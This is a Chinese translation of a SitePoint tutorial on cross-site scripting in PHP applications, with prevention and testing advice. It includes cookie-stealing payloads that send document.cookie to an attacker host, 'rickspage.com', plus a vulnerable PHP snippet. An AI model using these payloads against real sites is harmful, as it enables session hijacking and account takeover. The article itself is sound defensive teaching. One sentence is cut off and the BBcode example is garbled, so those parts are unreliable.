# 跨站点脚本可能会让您丢失 Cookies

> 原文：<https://www.sitepoint.com/cross-site-scripting-could-make-you-lose-your-cookies/>

跨站脚本(XSS)是一种威胁任何 web 应用程序的安全利用形式。它的严重性经常被低估。这些问题远远超出了烦恼和恶作剧。通过窃取您的 cookies，跨站点脚本攻击可以让攻击者获得对您的 CMS 的管理权限。

它是如何产生的？当 web 应用程序(如 PHP 脚本)显示用户提交的内容而不进行过滤时，问题就出现了。如果用户提交留言簿条目、博客评论，甚至用户名和密码，这些内容可能包含所有需要过滤掉的不良内容，如果它们要显示在网页上的话。这些代码可能是相对无害的(例如恶作剧),也可能是恶意的(旨在获取私人信息以侵入您的系统)。通常这些“讨厌的东西”是脚本——因此被称为“跨站点脚本”。

跨站点脚本的相对无害的用途:

*   旨在破坏网页布局或外观的 HTML 代码。
*   用于恶作剧的脚本、小程序或对象，显示恼人的消息或弹出窗口。

跨站点脚本的一些更有害的用法:

*   链接到 URL 的误导性超链接会导致操作发生，例如注销用户、发布帖子或更改密码。
*   脚本或“javascript:”超链接，旨在从 cookies 中收集私人信息，并将其传输到第三方网站，以便获得系统的管理员访问权限。
*   旨在利用特定浏览器中已知安全漏洞的对象或小程序。

**跨站点脚本利用的生命周期**

我发现跨站点脚本是一个很难描述的概念。我将带领您通过一个典型的跨站点脚本场景，给出一些可能的例子。

Joe 为自己建立了一个 CMS，包括用户帐户、会话和不同用户的不同访问级别。要登录他的 CMS，他需要在网站的登录表单中输入用户名和密码。在他的浏览器会话期间，一个 cookie 存储他的“会话 ID ”,允许他在浏览网站时保持登录。

乔的网站还允许任何用户注册一个新账户，并在网站上发布“消息”。例如，消息可以放在博客评论中，或者放在用户的个人资料中，甚至可以放在用户的用户名中。不幸的是，Joe 忘了在某些地方使用 [htmlspecialchars](http://au.php.net/htmlspecialchars) 来将用户提交的内容回显到浏览器中。

恶意用户 Rick 在 Joe 的网站上注册并填写了他的新个人资料页面。在他的用户简档中，他包括文本:

```
 <script>alert('Hello World');</script> 
```

现在，每当 Joe(或其他任何人)查看 Rick 的用户资料时，他都会看到一个讨厌的 JavaScript 弹出窗口嘲笑他。

Rick 变得更加狡猾，将以下代码放入 Joe 网站的博客评论中:

```
 <a href="/usercp.php?action=logout">A webpage about cats</a>
```

现在，每当 Joe(或任何其他人)点击链接，相信它会带他们到一个关于猫的网页，他将被注销他的 CMS。这很烦人，困扰了乔很长时间。

情况变得更糟。Rick 现在将以下代码放入 Joe 页面的留言簿条目中:

```
 <script>location.replace('http://rickspage.com/?secret='+document.cookie)</script>
```

现在，每当乔(或任何其他人)查看留言簿时，他将被重定向到里克网站上的一个页面。此外，Joe 的浏览器会话中的 cookie 已经作为 URL 的一部分传输到 Rick 的 web 服务器。

Rick 现在使用 Joe 浏览器会话中的 cookie，通过 Joe 的帐户浏览 Joe 的 CMS。Rick 可以更改 Joe 的密码，授予自己管理员权限，或者开始删除内容。

Rick 在 Joe 的留言簿上放了一个

瑞克本可以用其他方法达到同样的效果。例如，Rick 可以使用 JavaScript 链接欺骗 Joe 向他的服务器发送完全相同的信息:

```
 <a href="javascript:location.replace('http://rickspage.com/?secret='+document.cookie)">
A Webpage about dogs</a>
```

如果 Joe 点击了那个链接(他可能经常这样做),他的会话 ID 就会被传输到 Rick 的服务器。

此外，Rick 可以将他的 JavaScript 嵌入到事件处理程序属性中，如“onclick”、“onmousemove”和“onsubmit”，后者可用于修改网站上的表单。

Rick 也可以尝试使用 JavaScript 之外的工具，比如 ActiveX 控件或小程序。

**修补那些洞**

下面是一些步骤，你可以采取这些步骤来帮助防止跨站点脚本攻击被用于你的 PHP 应用程序。

每当在你的网站上显示用户提交的内容时，在回显之前，在数据上使用 [htmlspecialchars](http://au.php.net/htmlspecialchars) 。这包括来自数据库的数据。

你可能会在你没有意识到的地方显示未经过滤的用户提交的内容。比如下面这个就很危险。

```
 if (strlen($_GET['username']) > 12)
{
  exit("Error: {$_GET['username']} is too long.  Your username may be nor more than 12 characters");
} 
```

在这种情况下，用户变量“username”未经过滤就被发送到浏览器。用户可以构建一个类似于下面的 URL，并欺骗人们点击它:

```
 http://www.example.com/register.php?username=<script>alert('gotcha');</script> 
```

JavaScript 是无害的，但可以被修改，从 cookies 中窃取信息，并传输给第三方。

如果用户劫持了用户会话，您还可以减少可能造成的损失。在设计 CMS 时，不要完全依赖 cookies 进行用户认证。除了 cookie 之外，当用户执行某些高风险操作时，如使用 CMS 的“管理员”部分或更改其密码时，也应要求用户输入密码。因此，如果您的会话被劫持使用您的会话 ID，攻击者将无法更改您的密码或严重破坏您的网站。然而，降低遭受攻击的风险应该是预防攻击的第二要务。

**测试应用程序中的跨站点脚本漏洞**

测试跨站点脚本漏洞的一种快速方法是将以下代码插入任何用户提交的变量中。例如，将以下代码粘贴到您的博客评论表单中:

```
 <script>alert('Hello World!');</script>
```

然后，访问你的博客，看看评论是什么样子的。如果您在提交时看到代码，那么您的应用程序正确地处理了它。如果您的注释为空，并且您看到一个 JavaScript 弹出窗口，则您的应用程序易受攻击。

重要的是不要只测试用户可以提交内容的明显位置。在广场之外思考。例如，你到处显示用户名——用户可能在用户名中嵌入 HTML 或 JavaScript 吗？签名呢？秘密问答？

在从用户提交的内容中过滤掉 HTML，但使用另一种标记语言的情况下，跨站点脚本甚至会成为一个问题:

BBcode:

```
 https%3A%2F%2Feditor.sitepoint.com
```

Wiki markup:

```
 [javascript:alert("Yes");|Are you vulnerable?]
```

以上两种攻击(针对公告板和 Wikis)要求毫无戒心的用户实际点击链接，以便执行脚本。有趣的是，我们在 SitePoint 内部使用的维基很容易受到攻击。如果有人被骗点击了某个链接，那么该链接中的任何 JavaScript 都会运行。

令人欣慰的是，vBulletin 似乎不容易受到使用上述方法提交的 javascript:链接的攻击。

关于跨站点脚本的更多信息可以在这个 [CERT Advisory](http://www.cert.org/advisories/CA-2000-02.html) 和这个来自 Apache 的[文档中获得。Apache 文档指出“跨站点脚本”这个名称是一个误导性的术语，因为攻击不需要涉及脚本，它们甚至不需要跨站点。在这篇博客的前面，Harry 谈到了](http://httpd.apache.org/info/css-security/)[处理来自陌生人的内容](https://www.sitepoint.com/blog/)，这提供了更多关于如何保护你的应用程序免受攻击的信息。

看看这篇由 Chris Shiflett 撰写的关于防止跨站脚本攻击的文章。

跨站点脚本只是对 web 应用程序进行远程攻击的一种可能形式。这可能是 web 应用程序中最常见的漏洞之一，此外还有 SQL 注入漏洞，这个漏洞之前在本博客中已经讨论过，与 PHP 中的[魔术引号](https://www.sitepoint.com/blog/)有关。

## 分享这篇文章